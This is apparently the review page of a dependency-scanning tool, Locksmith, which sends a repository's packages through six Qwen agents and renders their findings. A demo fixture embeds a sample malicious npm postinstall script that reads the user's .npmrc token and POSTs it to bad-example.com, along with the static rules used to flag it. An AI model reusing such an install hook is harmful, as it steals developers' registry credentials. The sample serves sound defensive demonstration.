"use client";

import { useEffect, useRef, useState } from "react";
import RepoSearch from "../components/RepoSearch";
import Report, { agents, type Finding, type PackageEvidence, type ReviewResult, type RoleStatus } from "../components/Report";
import { LIVE_PHASES, phaseState, roleState, type LiveRole } from "../../lib/agentProgress";
import "./review.css";
type ReviewJob = {
  reviewId:string;
  status:"queued"|"retrieving-packages"|"running"|"complete"|"failed";
  currentRole?:string;
  currentRoles?:string[];
  completedRoles:string[];
  roleStatus?:Record<string,RoleStatus>;
  roleErrors?:Record<string,string>;
  packages:PackageEvidence[];
  findings:Finding[];
  result?:ReviewResult;
  error?:string;
};

export default function ReviewPage() {
  const [repo, setRepo] = useState("");
  const [phase, setPhase] = useState<"input"|"audit"|"report">("input");
  const [job, setJob] = useState<ReviewJob|null>(null);
  const [error, setError] = useState("");
  const poll = useRef<ReturnType<typeof setInterval>|null>(null);
  const autoStarted = useRef(false);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("fixture") === "1") {
      setRepo("fixture://locksmith-redesign");
      setJob(fixtureJob());
      setPhase("report");
      return;
    }
    const liveFixture = params.get("liveFixture");
    if (liveFixture) {
      setRepo(`fixture://locksmith-${liveFixture}`);
      setJob(liveFixtureJob(liveFixture));
      setPhase("audit");
      return;
    }
    const imported = params.get("repo");
    const branch = params.get("branch") || undefined;
    if (!imported?.startsWith("https://github.com/")) return;
    setRepo(imported);
    if (autoStarted.current) return;
    autoStarted.current = true;
    void runReview({ repo: imported, branch });
  }, []);

  useEffect(() => () => { if (poll.current) clearInterval(poll.current); }, []);

  async function loadJob(reviewId:string) {
    const response = await fetch(`/api/review/${reviewId}`, { cache:"no-store" });
    const data = await response.json();
    if (!response.ok) throw new Error(data.error || "Review status failed");
    setJob(data);
    if (data.status === "complete") {
      if (poll.current) clearInterval(poll.current);
      setPhase("report");
    }
    if (data.status === "failed") {
      if (poll.current) clearInterval(poll.current);
      setError(data.error || "Review failed");
      setPhase("input");
    }
  }

  async function runReview(payload:{ repo?:string; branch?:string } = { repo }) {
    if (poll.current) clearInterval(poll.current);
    if (payload.repo) setRepo(payload.repo);
    setError("");
    setJob(null);
    setPhase("audit");
    try {
      const response = await fetch("/api/review", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload) });
      const data = await response.json();
      if (!response.ok) throw new Error(data.error || "Review failed");
      if (!data.reviewId) throw new Error("Review did not start. Try again.");
      await loadJob(data.reviewId);
      poll.current = setInterval(() => void loadJob(data.reviewId).catch(cause => {
        if (poll.current) clearInterval(poll.current);
        setError(cause instanceof Error ? cause.message : "Review status failed");
        setPhase("input");
      }), 1000);
    } catch (cause) {
      setError(cause instanceof Error ? cause.message : "Review failed");
      setPhase("input");
    }
  }

  const result = job?.result;
  const findings = job?.findings || result?.findings || [];
  const packages = result?.packages || job?.packages || [];

  return <main className="review-page">
    {phase === "input" ? <section className="review-start">
      <p className="eyebrow">Workspace review / Qwen live analysis</p>
      <h1>Review a dependency state.</h1>
      <p>Locksmith retrieves real dependency files, sends them through six specialist Qwen agents, and saves the result locally.</p>
      <RepoSearch id="review-repo" initialRepo={repo} variant="review" onScan={runReview} />
      {error ? <p role="alert" style={{color:"var(--red)",fontFamily:"var(--mono)",fontSize:14}}>{error}</p> : null}
    </section> : null}

    {phase === "audit" ? <section className="audit-screen" aria-live="polite">
      <div className="audit-head"><div><p className="eyebrow">Live dependency review</p><h1>Building the case.</h1></div><strong>{findings.length.toString().padStart(2,"0")} / 06</strong></div>
      <div className="audit-repo"><i /> Reviewing <code>{repo}</code></div>
      {job?.status === "retrieving-packages" || packages.length ? <section className="package-panel">
        <h2>Retrieved packages</h2>
        <div className="package-grid">{packages.length ? packages.map(pkg => <PackageCard pkg={pkg} key={`${pkg.name}@${pkg.version}`} />) : <p>Fetching package artifacts...</p>}</div>
      </section> : null}
      <div className="phase-list">{LIVE_PHASES.map(phaseInfo => {
        const state = phaseState(phaseInfo.roles, job || undefined);
        const title = phaseInfo.name === "Parallel inspection" && state === "running" ? "Parallel inspection running" : phaseInfo.name;
        return <section className={`agent-phase phase-${state}`} key={phaseInfo.name}>
          <h2>{title}</h2>
          <div>{phaseInfo.roles.map(role => {
            const finding = findings.find(item => item.role === role);
            const state = roleState(role, job || undefined);
            const agent = agents.find(item => item.name === role)!;
            return <article className={`live-agent-card agent-${state}`} key={role} title={agent.title}>
              <strong>{role}</strong>
              <p>{job?.roleErrors?.[role] || finding?.summary || (state === "running" ? "Running..." : "Waiting for evidence")}</p>
              <em>{finding?.verdict || state}</em>
            </article>;
          })}</div>
        </section>;
      })}</div>
    </section> : null}

    {phase === "report" && result ? <Report result={result} job={job || undefined} /> : null}
  </main>;
}

function fixtureJob(): ReviewJob {
  const suspicious = {
    name: "fake-logger",
    version: "1.3.0",
    packageManager: "npm" as const,
    dependencyType: "dependencies",
    scanStatus: "new" as const,
    evidenceSource: "fresh-scan" as const,
    artifactKey: "npm:fake-logger@1.3.0:sha512-fixture",
    fileCount: 4,
    files: ["package/package.json", "package/scripts/postinstall.js", "package/index.js", "package/README.md"],
    inspectedFiles: [{
      path: "package/scripts/postinstall.js",
      reason: "suspicious static pattern",
      contentTruncated: true,
      displayedBytes: 260,
      originalBytes: 24000,
      content: "const fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst npmrc = path.join(os.homedir(), \".npmrc\");\nconst token = fs.readFileSync(npmrc, \"utf8\");\n\nfetch(\"https://bad-example.com/collect\", {\n  method: \"POST\",\n  body: token\n});",
    }],
    suspiciousLines: [
      { filePath: "package/scripts/postinstall.js", startLine: 5, severity: "critical" as const, sourceAgent: "Static", reason: "Static Agent: references npm credentials.", rule: ".npmrc" },
      { filePath: "package/scripts/postinstall.js", startLine: 5, severity: "high" as const, sourceAgent: "Static", reason: "Static Agent: accesses the user home directory.", rule: "os.homedir" },
      { filePath: "package/scripts/postinstall.js", startLine: 6, severity: "high" as const, sourceAgent: "Static", reason: "Static Agent: reads local files.", rule: "fs.readFile" },
      { filePath: "package/scripts/postinstall.js", startLine: 8, severity: "medium" as const, sourceAgent: "Static", reason: "Static Agent: contains outbound URL.", rule: "url" },
    ],
    status: "Block" as const,
    reason: "Install script reads npm credentials and sends data to an external URL.",
    evidence: ["package/scripts/postinstall.js line 8"],
  };
  const reused = {
    name: "next",
    version: "15.3.4",
    packageManager: "npm" as const,
    dependencyType: "dependencies",
    scanStatus: "reused" as const,
    evidenceSource: "global-cache" as const,
    evidenceId: "ev_next_1534",
    previousReviewId: "rev_previous",
    artifactKey: "npm:next@15.3.4:sha512-fixture",
    fileCount: 2,
    files: ["package/package.json", "package/dist/index.js"],
    inspectedFiles: [{ path: "package/package.json", reason: "package manifest", content: "{\"name\":\"next\"}" }],
    suspiciousLines: [],
    status: "Allow" as const,
    reason: "Package evidence reused from global cache. Workspace approval still checked separately.",
    evidence: [],
  };
  const findings = agents.map(agent => ({
    role: agent.name,
    verdict: agent.name === "Judge" ? "Block" as const : "Review" as const,
    summary: agent.name === "Static" ? "Found credential file access and outbound upload." : `${agent.name} checked package evidence.`,
    evidence: agent.name === "Static" ? ["package/scripts/postinstall.js line 8"] : [`${agent.name} evidence`],
    confidence: 0.8,
  }));
  const result: ReviewResult = {
    reviewId: "rev_fixture",
    dependencyStateId: "state_fixture",
    source: "fixture://locksmith-redesign",
    files: ["package.json", "package-lock.json"],
    packages: [suspicious, reused],
    packageCount: 2,
    inspectedPackageCount: 2,
    packageSummary: "2 packages reviewed: 1 allow, 0 review, 1 block.",
    findings,
    verdict: "Block",
    remediation: "Remove fake-logger, rollback the lockfile, or pin the previous approved version.",
    mode: "qwen",
    model: "fixture",
  };
  return {
    reviewId: "rev_fixture",
    status: "complete",
    currentRoles: [],
    completedRoles: agents.map(agent => agent.name),
    roleStatus: Object.fromEntries(agents.map(agent => [agent.name, "done"])) as Record<string, RoleStatus>,
    packages: result.packages,
    findings,
    result,
  };
}

function liveFixtureJob(state:string): ReviewJob {
  const job = fixtureJob();
  const queued = Object.fromEntries(agents.map(agent => [agent.name, "queued"])) as Record<string, RoleStatus>;
  job.status = "running";
  job.result = undefined;
  job.findings = [];
  job.completedRoles = [];
  job.currentRole = undefined;
  job.currentRoles = [];
  job.roleErrors = undefined;
  job.roleStatus = queued;
  if (state === "baseline") {
    job.currentRole = "Baseline";
    job.currentRoles = ["Baseline"];
    job.roleStatus.Baseline = "running";
  } else if (state === "parallel") {
    job.completedRoles = ["Baseline"];
    job.findings = fixtureJob().findings.filter(finding => finding.role === "Baseline");
    job.currentRole = "Behavior";
    job.currentRoles = ["Manifest", "Static", "Behavior"];
    job.roleStatus = { ...queued, Baseline: "done", Manifest: "running", Static: "running", Behavior: "running" };
  } else if (state === "failed") {
    job.completedRoles = ["Baseline", "Manifest", "Behavior"];
    job.findings = fixtureJob().findings.filter(finding => ["Baseline", "Manifest", "Behavior"].includes(finding.role));
    job.currentRoles = ["Skeptic"];
    job.currentRole = "Skeptic";
    job.roleStatus = { ...queued, Baseline: "done", Manifest: "done", Static: "failed", Behavior: "done", Skeptic: "running" };
    job.roleErrors = { Static: "Static request failed" };
  } else if (state === "all-failed") {
    job.completedRoles = ["Baseline"];
    job.findings = fixtureJob().findings.filter(finding => finding.role === "Baseline");
    job.currentRoles = ["Skeptic"];
    job.currentRole = "Skeptic";
    job.roleStatus = { ...queued, Baseline: "done", Manifest: "failed", Static: "failed", Behavior: "failed", Skeptic: "running" };
    job.roleErrors = { Manifest: "Manifest request failed", Static: "Static request failed", Behavior: "Behavior request failed" };
  }
  return job;
}

function PackageCard({ pkg }:{ pkg:PackageEvidence }) {
  return <article className={`package-card status-${pkg.status.toLowerCase()}`}>
    <header><div><strong>{pkg.name}</strong><code>{pkg.version}</code></div><b>{pkg.status}</b></header>
    <p>{pkg.reason}</p>
    <dl><div><dt>Type</dt><dd>{pkg.dependencyType}</dd></div><div><dt>Files</dt><dd>{pkg.fileCount}</dd></div><div><dt>Inspected</dt><dd>{pkg.inspectedFiles.map(file => file.path).join(" · ") || "None"}</dd></div></dl>
    {pkg.evidence?.length ? <small>{pkg.evidence.join(" · ")}</small> : null}
    <details><summary>All internal files</summary><ol>{pkg.files.map(file => <li key={file}>{file}</li>)}</ol></details>
  </article>;
}
